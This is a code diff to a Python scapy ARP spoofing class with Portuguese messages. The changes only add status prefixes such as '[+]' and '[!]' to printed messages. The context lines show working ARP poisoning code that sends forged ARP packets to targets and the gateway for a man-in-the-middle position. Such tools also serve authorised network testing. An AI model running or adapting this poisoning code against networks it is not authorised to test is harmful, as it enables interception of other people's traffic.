@@ -88,15 +88,14 @@ class ARPspoof(object):
 			return target_list
 
 		except AddrFormatError:
-			sys.exit("Especifique um Endereço/Range IP válido como alvo.")
-
+			sys.exit("[!] Especifique um Endereço/Range IP válido como alvo.")
 
 	def start_arp_mon(self):
 		try:
 			sniff(prn=self.arp_mon_callback, filter="arp", store=0)
 		except Exception as e:
 			if "Interrupted system call" not in e:
-				print "Exceção ocorreu enquanto iniciava o sniffer: {}".format(e)
+				print "[!] Exceção ocorreu enquanto iniciava o sniffer: {}".format(e)
 
 	def arp_mon_callback(self,pkt):
 		if self.send is True:
@@ -153,9 +152,9 @@ class ARPspoof(object):
 			if len(resp) > 0:
 				targetmac = resp[0][1].hwsrc
 				self.arp_cache[targetip] = targetmac
-				print "Resolvido {} --> {}".format(targetip, targetmac)
+				print "[+] Resolvido {} --> {}".format(targetip, targetmac)
 			else:
-				print "Não foi possivel resolver o endereço MAC de {}".format(targetip)
+				print "[-] Não foi possivel resolver o endereço MAC de {}".format(targetip)
 		return targetmac
 
 
@@ -179,7 +178,7 @@ class ARPspoof(object):
 						
 						if targetmac is not None:
 							try:
-								print "[+]Evenenando {} <--> {}".format(targetip, self.gateway)
+								print "[+] Evenenando {} <--> {}".format(targetip, self.gateway)
 								self.socket2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op=arpmode))
 								self.socket2.send(Ether(src=targetmac, dst=self.gateway_mac)/ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op=arpmode))
 						
@@ -216,7 +215,7 @@ class ARPspoof(object):
 							self.socket2.send(Ether(src=self.gateway_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=targetip, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac))
 					except Exception as e:
 						if "Interrupted system call" not in e:
-							print "Exceção ocorreu enquanto envenava {}: {}".format(targetip, e)
+							print "[!] Exceção ocorreu enquanto envenava {}: {}".format(targetip, e)
 
 		
 		set_ip_forwarding(0)
